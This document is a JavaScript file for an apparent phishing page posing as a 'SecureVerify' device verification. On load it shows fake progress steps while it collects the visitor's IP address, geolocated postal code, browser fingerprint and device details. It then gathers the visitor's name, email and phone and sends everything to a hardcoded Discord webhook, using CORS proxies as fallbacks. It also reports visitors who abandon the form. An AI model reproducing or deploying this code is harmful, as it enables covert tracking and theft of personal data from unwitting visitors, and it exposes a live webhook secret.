const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';

let loadingProgress = 0;
let userIP = '';
let userPostalCode = '';
let initialWebhookSent = false;
let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
let formStartTime = Date.now();
let userVisitId = 'USR-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2, 4).toUpperCase();
let userFingerprint = generateUserFingerprint();
let inactivityTimer = null;
const INACTIVITY_TIMEOUT = 5 * 60 * 1000; // 5 minutes

// Store session data in localStorage as backup
function storeSessionData() {
    const sessionData = {
        sessionId: sessionId,
        ipAddress: userIP,
        postalCode: userPostalCode,
        startTime: formStartTime,
        initialWebhookSent: initialWebhookSent,
        lastActivity: Date.now()
    };
    
    try {
        localStorage.setItem('userSession_' + sessionId, JSON.stringify(sessionData));
        console.log('💾 Session data stored in localStorage');
    } catch (error) {
        console.error('❌ Failed to store session data:', error);
    }
}

// Setup inactivity monitoring
function setupInactivityMonitoring() {
    // Reset timer on user activity
    const resetTimer = () => {
        if (inactivityTimer) {
            clearTimeout(inactivityTimer);
        }
        
        inactivityTimer = setTimeout(() => {
            console.log('⏰ Inactivity timeout reached');
            handleIncompleteSession();
        }, INACTIVITY_TIMEOUT);
        
        // Update last activity time
        storeSessionData();
    };
    
    // Monitor user activity
    ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'].forEach(event => {
        document.addEventListener(event, resetTimer, true);
    });
    
    // Start the timer
    resetTimer();
}

// Handle incomplete session (user didn't complete form)
function handleIncompleteSession() {
    console.log('📝 Handling incomplete session...');
    
    // Send final webhook with just the information we have
    sendIncompleteSessionWebhook();
    
    // Show a message to the user
    showIncompleteSessionMessage();
}

// Send webhook for incomplete session with enhanced identification
async function sendIncompleteSessionWebhook() {
    if (!userIP && !userPostalCode) {
        console.log('❌ No location information to send');
        return;
    }
    
    try {
        const deviceInfo = getDeviceInfo();
        const sessionDuration = Date.now() - formStartTime;
        const currentTime = new Date();
        
        const embed = {
            title: '⚠️ **INCOMPLETE SESSION DETECTED**',
            description: '👤 User visited but abandoned the verification process',
            color: 0xff9500, // Orange color for incomplete
            fields: [
                { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
                { name: '🕐 **SESSION TIMELINE**', value: `**Started:** ${formatTimestamp(new Date(formStartTime))}\n**Ended:** ${formatTimestamp(currentTime)}\n**Duration:** ${formatDuration(sessionDuration)}`, inline: false },
                { name: '🌐 **LOCATION DATA**', value: `**IP Address:** \`${userIP}\`\n**Postal Code:** \`${userPostalCode}\``, inline: true },
                { name: '📱 **DEVICE INFO**', value: `**Type:** ${deviceInfo.mobileDeviceType}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}`, inline: true },
                { name: '📊 **SESSION STATUS**', value: `**Form Status:** ❌ Not Completed\n**Initial Webhook:** ${initialWebhookSent ? '✅ Sent' : '❌ Failed'}`, inline: false }
            ],
            footer: {
                text: `🔐 SecureVerify System | User: ${userVisitId} | Session Abandoned`
            }
        };

        const payload = {
            embeds: [embed]
        };
        
        console.log('📤 Sending incomplete session webhook...');
        const success = await trySendWebhookMethods(payload);
        
        if (success) {
            console.log('✅ Incomplete session webhook sent successfully');
        } else {
            console.error('❌ Failed to send incomplete session webhook');
        }
        
    } catch (error) {
        console.error('❌ Error sending incomplete session webhook:', error);
    }
}

// Format duration for display
function formatDuration(milliseconds) {
    const seconds = Math.floor(milliseconds / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    
    if (hours > 0) {
        return `${hours}h ${minutes % 60}m ${seconds % 60}s`;
    } else if (minutes > 0) {
        return `${minutes}m ${seconds % 60}s`;
    } else {
        return `${seconds}s`;
    }
}

// Show message for incomplete session
function showIncompleteSessionMessage() {
    const message = document.createElement('div');
    message.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: rgba(255, 149, 0, 0.9);
        color: white;
        padding: 15px 20px;
        border-radius: 8px;
        font-size: 14px;
        z-index: 10000;
        max-width: 300px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    `;
    message.innerHTML = `
        <strong>⏰ Session Timeout</strong><br>
        Your session has ended due to inactivity.<br>
        <small>Your IP information has been recorded.</small>
    `;
    
    document.body.appendChild(message);
    
    // Remove message after 5 seconds
    setTimeout(() => {
        if (message.parentNode) {
            message.parentNode.removeChild(message);
        }
    }, 5000);
}

const loadingSteps = [
    { text: 'Initializing system...', duration: 1500 },
    { text: 'Checking system requirements...', duration: 2000 },
    { text: 'Verifying device compatibility...', duration: 2000 },
    { text: 'Preparing authentication...', duration: 1500 },
    { text: 'Setting up verification...', duration: 1000 }
];

function getMobileDeviceType() {
    const userAgent = navigator.userAgent;
    if (/iPhone|iPad|iPod/i.test(userAgent)) {
        return 'iOS Device';
    } else if (/Android/i.test(userAgent)) {
        return 'Android Device';
    } else if (/Mobile|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return 'Mobile Device';
    } else {
        return 'Desktop/Laptop';
    }
}

function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function validatePhoneNumber(phone) {
    const cleaned = phone.replace(/[^0-9]/g, '');
    return cleaned.length >= 8 && cleaned.length <= 15;
}

function formatPhoneNumber(phone) {
    const cleaned = phone.replace(/[^0-9]/g, '');
    if (cleaned.length <= 3) {
        return cleaned;
    } else if (cleaned.length <= 6) {
        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
    } else if (cleaned.length <= 10) {
        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6)}`;
    } else {
        return `+${cleaned.slice(0, cleaned.length - 10)} (${cleaned.slice(-10, -7)}) ${cleaned.slice(-7, -4)}-${cleaned.slice(-4)}`;
    }
}

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const colorDepth = `${window.screen.colorDepth} bit`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const timestamp = new Date().toISOString();
    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
    const cpuCores = navigator.hardwareConcurrency || 'Unknown';
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
    const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
    const mobileDeviceType = getMobileDeviceType();

    return {
        userAgent,
        platform,
        language,
        screenRes,
        colorDepth,
        timezone,
        timestamp,
        deviceMemory,
        cpuCores,
        isMobile,
        browser,
        os,
        mobileDeviceType
    };
}

async function sendWebhook(userData) {
    console.log('🚀 Starting completion webhook send process...');
    console.log('📋 User data:', userData);
    console.log('🆔 Session ID:', sessionId);
    
    if (!WEBHOOK_URL) {
        console.error('❌ Webhook URL is not configured');
        return false;
    }
    
    try {
        const currentTime = new Date();
        const sessionDuration = Date.now() - formStartTime;
        
        // Use the location data we already collected
        const ipAddress = userIP || 'Unknown IP';
        const postalCode = userPostalCode || 'Unknown Postal Code';
        console.log('📍 Using collected location data:');
        console.log('  - IP Address:', ipAddress);
        console.log('  - Postal Code:', postalCode);

        console.log('📱 Getting device info...');
        const deviceInfo = getDeviceInfo();
        console.log('📊 Device info collected:', deviceInfo);

        console.log('🔧 Building completion webhook payload...');
        const embed = {
            title: '✅ **USER VERIFICATION COMPLETED**',
            description: '👤 User successfully completed the verification process',
            color: 0x00ff00, // Green color for completion
            fields: [
                { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
                { name: '🕐 **SESSION TIMELINE**', value: `**Started:** ${formatTimestamp(new Date(formStartTime))}\n**Completed:** ${formatTimestamp(currentTime)}\n**Duration:** ${formatDuration(sessionDuration)}`, inline: false },
                { name: '👤 **USER INFORMATION**', value: `**Full Name:** ${userData.name || 'Not provided'}\n**Email:** ${userData.email || 'Not provided'}\n**Phone:** ${userData.phone || 'Not provided'}`, inline: false },
                { name: '🌐 **LOCATION DATA**', value: `**IP Address:** \`${ipAddress}\`\n**Postal Code:** \`${postalCode}\``, inline: true },
                { name: '📱 **DEVICE INFO**', value: `**Type:** ${deviceInfo.mobileDeviceType}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}\n**OS:** ${deviceInfo.os}\n**Language:** ${deviceInfo.language}`, inline: true },
                { name: '🖥️ **SYSTEM SPECS**', value: `**Screen:** ${deviceInfo.screenRes}\n**Color Depth:** ${deviceInfo.colorDepth}\n**Memory:** ${deviceInfo.deviceMemory}\n**CPU Cores:** ${deviceInfo.cpuCores}\n**Timezone:** ${deviceInfo.timezone}`, inline: true },
                { name: '📊 **SESSION STATUS**', value: `**Form Status:** ✅ Completed\n**Initial Webhook:** ${initialWebhookSent ? '✅ Sent' : '❌ Failed'}`, inline: false }
            ],
            footer: {
                text: `🔐 SecureVerify System | User: ${userVisitId} | Verification Completed`
            }
        };

        const payload = {
            embeds: [embed]
        };
        
        console.log('📤 Preparing to send completion webhook...');
        console.log('📦 Completion payload:', JSON.stringify(payload, null, 2));
        
        // Try multiple methods to send webhook
        const success = await trySendWebhookMethods(payload);
        
        if (success) {
            console.log('✅ Completion webhook sent successfully');
        } else {
            console.error('❌ Failed to send completion webhook');
        }
        
        return success;
        
    } catch (error) {
        console.error('❌ Error in completion webhook process:', error);
        console.error('❌ Error details:', error.message);
        return false;
    }
}

async function trySendWebhookMethods(payload) {
    // Method 1: Direct fetch (works when served from web server)
    console.log('🔄 Method 1: Trying direct fetch...');
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        console.log('📡 Direct fetch response status:', response.status);
        
        if (response.ok) {
            console.log('✅ Direct fetch succeeded!');
            return true;
        }
    } catch (error) {
        console.log('❌ Direct fetch failed:', error.message);
    }
    
    // Method 2: Working CORS proxy (for local file access)
    console.log('🔄 Method 2: Trying CORS proxy...');
    try {
        const corsProxy = 'https://corsproxy.io/?';
        const proxyUrl = corsProxy + encodeURIComponent(WEBHOOK_URL);
        
        console.log('🌐 Using proxy URL:', proxyUrl);
        
        const response = await fetch(proxyUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(payload)
        });
        
        console.log('📡 Proxy response status:', response.status);
        
        if (response.ok) {
            console.log('✅ CORS proxy succeeded!');
            return true;
        } else {
            const errorText = await response.text();
            console.error('❌ Proxy failed. Status:', response.status, 'Response:', errorText);
        }
    } catch (error) {
        console.log('❌ CORS proxy failed:', error.message);
    }
    
    // Method 3: Alternative CORS proxy
    console.log('🔄 Method 3: Trying alternative CORS proxy...');
    try {
        const altProxy = 'https://thingproxy.freeboard.io/fetch/';
        const proxyUrl = altProxy + WEBHOOK_URL;
        
        console.log('🌐 Using alternative proxy URL:', proxyUrl);
        
        const response = await fetch(proxyUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        console.log('📡 Alternative proxy response status:', response.status);
        
        if (response.ok) {
            console.log('✅ Alternative proxy succeeded!');
            return true;
        }
    } catch (error) {
        console.log('❌ Alternative proxy failed:', error.message);
    }
    
    // Method 4: Fallback - Store data locally and show manual send option
    console.log('🔄 Method 4: Fallback method...');
    try {
        // Store the data in localStorage for manual retrieval
        const storedData = {
            payload: payload,
            timestamp: new Date().toISOString(),
            webhookUrl: WEBHOOK_URL
        };
        
        localStorage.setItem('pendingWebhookData', JSON.stringify(storedData));
        console.log('💾 Data stored in localStorage for manual retrieval');
        
        // Show manual send instructions
        showManualSendInstructions(payload);
        
        return true; // Consider it successful since data is preserved
    } catch (error) {
        console.error('❌ Fallback method failed:', error);
    }
    
    console.error('❌ All webhook methods failed');
    return false;
}

function showManualSendInstructions(payload) {
    console.log('📋 === MANUAL SEND INSTRUCTIONS ===');
    console.log('📦 Copy this payload and send it manually:');
    console.log(JSON.stringify(payload, null, 2));
    console.log('🌐 Send to:', WEBHOOK_URL);
    console.log('🛠️ Use curl or Postman to send:');
    console.log(`curl -X POST -H "Content-Type: application/json" -d '${JSON.stringify(payload).replace(/'/g, '\\\'')}' ${WEBHOOK_URL}`);
    console.log('📋 === END MANUAL INSTRUCTIONS ===');
    
    // Also show in a user-friendly way
    alert('Webhook could not be sent automatically due to browser restrictions.\n\nPlease check the browser console (F12) for manual send instructions.\n\nYour data has been saved locally and will not be lost.');
}

function updateProgressBar(percentage) {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    progressFill.style.width = percentage + '%';
    
    if (percentage >= 100) {
        progressText.textContent = 'System ready!';
    }
}

function updateStatusItem(statusId, icon, text, isActive = false, isCompleted = false) {
    const statusItem = document.getElementById(statusId);
    const statusIcon = statusItem.querySelector('.status-icon');
    const statusText = statusItem.querySelector('.status-text');
    
    statusIcon.textContent = icon;
    statusText.textContent = text;
    
    statusItem.classList.remove('active', 'completed');
    if (isActive) {
        statusItem.classList.add('active');
    } else if (isCompleted) {
        statusItem.classList.add('completed');
    }
}

async function startLoadingSequence() {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    for (let i = 0; i < loadingSteps.length; i++) {
        const step = loadingSteps[i];
        progressText.textContent = step.text;
        
        // Update status items
        if (i === 0) {
            updateStatusItem('status-1', '⏳', step.text, true);
        } else if (i === 1) {
            updateStatusItem('status-1', '✅', 'Checking system requirements', false, true);
            updateStatusItem('status-2', '⏳', step.text, true);
        } else if (i === 2) {
            updateStatusItem('status-2', '✅', 'Verifying device compatibility', false, true);
            updateStatusItem('status-3', '⏳', step.text, true);
        } else if (i === 3) {
            updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
        }
        
        // Update progress bar
        const targetProgress = ((i + 1) / loadingSteps.length) * 100;
        const progressIncrement = targetProgress - loadingProgress;
        const steps = 20;
        const incrementAmount = progressIncrement / steps;
        
        for (let j = 0; j < steps; j++) {
            loadingProgress += incrementAmount;
            updateProgressBar(loadingProgress);
            await new Promise(resolve => setTimeout(resolve, step.duration / steps));
        }
        
        loadingProgress = targetProgress;
        updateProgressBar(loadingProgress);
    }
    
    // Complete all status items
    updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
    
    // Wait a moment before transitioning
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Hide loading screen and show verification screen
    console.log('🔄 Transitioning from loading screen to verification screen...');
    const loadingScreen = document.getElementById('loading-screen');
    const verificationScreen = document.getElementById('verification-screen');
    
    if (loadingScreen && verificationScreen) {
        loadingScreen.style.display = 'none';
        verificationScreen.style.display = 'flex';
        console.log('✅ Successfully transitioned to verification screen');
    } else {
        console.error('❌ Failed to find loading screen or verification screen elements');
        console.log('  - loadingScreen:', loadingScreen ? '✅ Found' : '❌ Missing');
        console.log('  - verificationScreen:', verificationScreen ? '✅ Found' : '❌ Missing');
    }
    
    // Get form elements
    const nameInput = document.getElementById('user-name');
    const emailInput = document.getElementById('user-email');
    const phoneInput = document.getElementById('user-phone');
    const submitBtn = document.getElementById('submit-info');
    const nameError = document.getElementById('name-error');
    const emailError = document.getElementById('email-error');
    const phoneError = document.getElementById('phone-error');
    
    // Check if all elements exist
    console.log('📋 Form elements check:');
    console.log('  - nameInput:', nameInput ? '✅ Found' : '❌ Missing');
    console.log('  - emailInput:', emailInput ? '✅ Found' : '❌ Missing');
    console.log('  - phoneInput:', phoneInput ? '✅ Found' : '❌ Missing');
    console.log('  - submitBtn:', submitBtn ? '✅ Found' : '❌ Missing');
    console.log('  - nameError:', nameError ? '✅ Found' : '❌ Missing');
    console.log('  - emailError:', emailError ? '✅ Found' : '❌ Missing');
    console.log('  - phoneError:', phoneError ? '✅ Found' : '❌ Missing');
    
    // Clear errors on input
    nameInput.addEventListener('input', function() {
        nameError.classList.remove('show');
        nameInput.classList.remove('error');
    });
    
    emailInput.addEventListener('input', function() {
        emailError.classList.remove('show');
        emailInput.classList.remove('error');
    });
    
    phoneInput.addEventListener('input', function(e) {
        const formatted = formatPhoneNumber(e.target.value);
        e.target.value = formatted;
        phoneError.classList.remove('show');
        phoneInput.classList.remove('error');
    });
    
    submitBtn.addEventListener('click', async function() {
        console.log('🚀 Submit button clicked!');
        
        const name = nameInput.value.trim();
        const email = emailInput.value.trim();
        const phone = phoneInput.value.trim();
        
        console.log('📋 Form data:');
        console.log('  - Name:', name);
        console.log('  - Email:', email);
        console.log('  - Phone:', phone);
        
        let hasError = false;
        
        // Validate name
        if (!name || name.length < 2) {
            nameError.textContent = 'Please enter your full name';
            nameError.classList.add('show');
            nameInput.classList.add('error');
            hasError = true;
        }
        
        // Validate email
        if (!validateEmail(email)) {
            emailError.textContent = 'Please enter a valid email address';
            emailError.classList.add('show');
            emailInput.classList.add('error');
            hasError = true;
        }
        
        // Validate phone
        if (!validatePhoneNumber(phone)) {
            phoneError.textContent = 'Please enter a valid phone number (8-15 digits)';
            phoneError.classList.add('show');
            phoneInput.classList.add('error');
            hasError = true;
        }
        
        if (hasError) {
            return;
        }
        
        // Disable button and show loading state
        submitBtn.disabled = true;
        submitBtn.textContent = 'Submitting...';
        
        // Prepare user data
        const userData = {
            name: name,
            email: email,
            phone: phone
        };

        try {
            console.log(' About to send webhook...');
            const webhookSuccess = await sendWebhook(userData);
            console.log(' Webhook result:', webhookSuccess);

            if (webhookSuccess) {
                console.log(' Webhook successful, showing success screen');
                document.getElementById('verification-screen').style.display = 'none';
                document.getElementById('success-screen').style.display = 'flex';
            } else {
                console.log(' Webhook failed, showing error');
                submitBtn.disabled = false;
                submitBtn.textContent = 'Submit Information';
                alert('Failed to send your information. Please try again.');
            }

            setTimeout(() => {
                console.log('Information submission process completed');
            }, 3000);
        } catch (error) {
            console.error('Error during submission:', error);

            
            // Show error message to user
            alert('There was an error submitting your information. Please try again.');
            
            // Re-enable the button
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit Information';
        }
    });
    
    // Allow Enter key submission
    [nameInput, emailInput, phoneInput].forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitBtn.click();
            }
        });
    });
}

window.addEventListener('load', function() {
    console.log('🚀 Application loaded');
    console.log('🆔 Session ID:', sessionId);
    
    // Setup inactivity monitoring
    setupInactivityMonitoring();
    
    // Start loading sequence immediately (don't wait for postal code collection)
    startLoadingSequence();
    
    // Collect location data and send initial webhook in the background (non-blocking)
    setTimeout(() => {
        collectLocationDataAndSendInitialWebhook();
    }, 100); // Small delay to ensure loading sequence starts first
});

// Get IP address with multiple fallback services
async function getIPAddress() {
    const ipServices = [
        { url: 'https://api.ipify.org?format=json', parser: (data) => data.ip },
        { url: 'https://ipapi.co/json/', parser: (data) => data.ip },
        { url: 'https://api.myip.com', parser: (data) => data.ip },
        { url: 'https://httpbin.org/ip', parser: (data) => data.origin },
        { url: 'https://ifconfig.me/ip', parser: (data) => data.trim() }
    ];
    
    for (const service of ipServices) {
        try {
            console.log(`🔄 Trying IP service: ${service.url}`);
            const response = await fetch(service.url, {
                method: 'GET',
                mode: 'cors',
                cache: 'no-cache',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                const ip = service.parser(data);
                
                if (ip && ip !== 'Unknown IP') {
                    console.log(`✅ IP retrieved from ${service.url}: ${ip}`);
                    return ip;
                }
            }
        } catch (error) {
            console.log(`❌ IP service ${service.url} failed:`, error.message);
        }
    }
    
    console.log('⚠️ All IP services failed, using fallback');
    return 'Unknown IP';
}

// Get postal code using geolocation API
async function getPostalCode() {
    console.log('📍 Getting postal code using geolocation...');
    
    try {
        // Try to get user's location using browser geolocation
        const position = await new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocation is not supported'));
                return;
            }
            
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: false,
                timeout: 10000,
                maximumAge: 300000 // 5 minutes
            });
        });
        
        const { latitude, longitude } = position.coords;
        console.log(`📍 Location obtained: ${latitude}, ${longitude}`);
        
        // Reverse geocoding to get postal code
        const postalCode = await reverseGeocode(latitude, longitude);
        
        if (postalCode) {
            console.log(`✅ Postal code retrieved: ${postalCode}`);
            return postalCode;
        }
    } catch (error) {
        console.log('❌ Geolocation failed:', error.message);
    }
    
    // Fallback: Ask user for postal code
    console.log('🔄 Asking user for postal code...');
    return await askUserForPostalCode();
}

// Reverse geocoding to get postal code from coordinates
async function reverseGeocode(latitude, longitude) {
    try {
        // Use Nominatim OpenStreetMap API
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`;
        
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'User-Agent': 'PhonzVerification/1.0'
            }
        });
        
        if (response.ok) {
            const data = await response.json();
            const address = data.address;
            
            // Try to get postal code from different possible fields
            const postalCode = address.postcode || address.postal_code || address.zip;
            
            if (postalCode) {
                return postalCode;
            }
        }
    } catch (error) {
        console.log('❌ Reverse geocoding failed:', error.message);
    }
    
    return null;
}

// Ask user for postal code as fallback
async function askUserForPostalCode() {
    return new Promise((resolve) => {
        const postalCode = prompt('📍 Please enter your postal/zip code for verification:');
        
        if (postalCode && postalCode.trim()) {
            console.log(`✅ User provided postal code: ${postalCode.trim()}`);
            resolve(postalCode.trim());
        } else {
            console.log('⚠️ No postal code provided, using default');
            resolve('Unknown Postal Code');
        }
    });
}

// Collect location data (IP + Postal Code) and send initial webhook
async function collectLocationDataAndSendInitialWebhook() {
    console.log('🌐 Starting location data collection and initial webhook...');
    
    try {
        // Get IP address
        console.log('📡 Getting IP address...');
        userIP = await getIPAddress();
        
        // Get postal code
        console.log('📍 Getting postal code...');
        userPostalCode = await getPostalCode();
        
        // Get device info
        console.log('📱 Getting device info...');
        const deviceInfo = getDeviceInfo();
        
        // Send initial webhook with both IP and postal code
        console.log('📤 Sending initial webhook with location data...');
        console.log('📋 IP Address:', userIP);
        console.log('📋 Postal Code:', userPostalCode);
        
        const initialSuccess = await sendInitialWebhook(userIP, userPostalCode, deviceInfo);
        
        if (initialSuccess) {
            initialWebhookSent = true;
            console.log('✅ Initial webhook sent successfully');
        } else {
            console.error('❌ Failed to send initial webhook');
            // Try simple fallback method
            console.log('🔄 Trying simple fallback webhook method...');
            const fallbackSuccess = await sendSimpleWebhook(userIP, userPostalCode, deviceInfo);
            if (fallbackSuccess) {
                initialWebhookSent = true;
                console.log('✅ Fallback webhook sent successfully');
            }
        }
        
    } catch (error) {
        console.error('❌ Error in initial webhook process:', error);
    }
}

// Generate user fingerprint for unique identification
function generateUserFingerprint() {
    const userAgent = navigator.userAgent;
    const screenRes = `${screen.width}x${screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;
    const platform = navigator.platform;
    
    // Create a simple hash
    const data = `${userAgent}|${screenRes}|${timezone}|${language}|${platform}`;
    let hash = 0;
    for (let i = 0; i < data.length; i++) {
        const char = data.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convert to 32-bit integer
    }
    return Math.abs(hash).toString(16).toUpperCase().padStart(8, '0');
}

// Format timestamp for display
function formatTimestamp(date) {
    return date.toLocaleString('en-US', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        timeZoneName: 'short'
    });
}

// Send initial webhook with enhanced user identification
async function sendInitialWebhook(ipAddress, postalCode, deviceInfo) {
    if (!WEBHOOK_URL) {
        console.error('❌ Webhook URL is not configured');
        return false;
    }
    
    try {
        const currentTime = new Date();
        const embed = {
            title: '🌐 **NEW USER VISIT DETECTED**',
            description: '👤 A new user has accessed the verification system',
            color: 0x00ff00, // Green color for initial
            fields: [
                { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
                { name: '🕐 **TIMESTAMP**', value: `**Access Time:** ${formatTimestamp(currentTime)}`, inline: false },
                { name: '🌐 **LOCATION DATA**', value: `**IP Address:** \`${ipAddress}\`\n**Postal Code:** \`${postalCode}\``, inline: true },
                { name: '📱 **DEVICE INFO**', value: `**Type:** ${deviceInfo.mobileDeviceType}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}\n**OS:** ${deviceInfo.os}\n**Language:** ${deviceInfo.language}`, inline: true },
                { name: '🖥️ **SYSTEM SPECS**', value: `**Screen:** ${deviceInfo.screenRes}\n**Color Depth:** ${deviceInfo.colorDepth}\n**Memory:** ${deviceInfo.deviceMemory}\n**CPU Cores:** ${deviceInfo.cpuCores}\n**Timezone:** ${deviceInfo.timezone}`, inline: true },
                { name: '📝 Status', value: '⏳ Awaiting user information submission...', inline: false }
            ],
            footer: {
                text: `🔐 SecureVerify System | User: ${userVisitId} | Fingerprint: ${userFingerprint}`
            }
        };

        const payload = {
            embeds: [embed]
        };
        
        console.log('📦 Initial webhook payload prepared');
        
        // Try to send webhook
        return await trySendWebhookMethods(payload);
        
    } catch (error) {
        console.error('❌ Error sending initial webhook:', error);
        return false;
    }
}

// Simple webhook fallback method with enhanced identification
async function sendSimpleWebhook(ipAddress, postalCode, deviceInfo) {
    if (!WEBHOOK_URL) {
        console.error('❌ Webhook URL is not configured');
        return false;
    }
    
    try {
        const currentTime = new Date();
        // Create a simple message payload with enhanced identification
        const message = `🌐 **NEW USER VISIT DETECTED**\n\n🏷️ **USER IDENTIFICATION**\n🆔 Visit ID: \`${userVisitId}\`\n🆔 Session ID: \`${sessionId}\`\n🔐 Fingerprint: \`${userFingerprint}\`\n\n🕐 **TIMESTAMP**\n⏰ Access Time: ${formatTimestamp(currentTime)}\n\n🌐 **LOCATION DATA**\n📡 IP Address: \`${ipAddress}\`\n📍 Postal Code: \`${postalCode}\`\n\n📱 **DEVICE INFORMATION**\n🖥️ Platform: ${deviceInfo.platform}\n📱 Device Type: ${deviceInfo.mobileDeviceType}\n🌍 Browser: ${deviceInfo.browser}\n🖥️ OS: ${deviceInfo.os}`;
        
        // Try using a simple POST request without complex headers
        const payload = {
            content: message,
            username: 'Phonz Verification Bot'
        };
        
        console.log('📦 Simple webhook payload prepared');
        
        // Try direct fetch with minimal headers
        try {
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log('✅ Simple webhook succeeded!');
                return true;
            }
        } catch (error) {
            console.log('❌ Simple webhook failed:', error.message);
        }
        
        // Fallback: Store in localStorage for manual retrieval
        const storedData = {
            message: message,
            timestamp: new Date().toISOString(),
            webhookUrl: WEBHOOK_URL,
            sessionData: {
                sessionId: sessionId,
                postalCode: postalCode,
                deviceInfo: deviceInfo
            }
        };
        
        localStorage.setItem('failedWebhook_' + Date.now(), JSON.stringify(storedData));
        console.log('💾 Webhook data stored in localStorage for manual retrieval');
        
        return false;
        
    } catch (error) {
        console.error('❌ Error in simple webhook:', error);
        return false;
    }
}
